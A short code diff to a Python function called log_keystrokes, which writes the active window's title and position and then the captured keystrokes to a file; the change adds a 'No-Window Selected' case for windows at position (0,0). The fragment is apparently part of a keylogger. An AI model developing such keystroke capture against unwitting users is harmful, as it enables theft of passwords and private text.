@@ -16,7 +16,12 @@ def log_keystrokes(event):
                 # If the active window has changed, update window information
                 current_window = active_window
                 f.write(f"\nWindow Title: {current_window.title}\n")
-                f.write(f"Window Position: ({current_window.left}, {current_window.top})\n")
+                
+                if current_window.left == 0 and current_window.top == 0:
+                    f.write("Window Position: No-Window Selected\n")
+                else:
+                    f.write(f"Window Position: ({current_window.left}, {current_window.top})\n")
+                    
                 f.write("Keystrokes:\n")
 
             if event.name == 'enter':
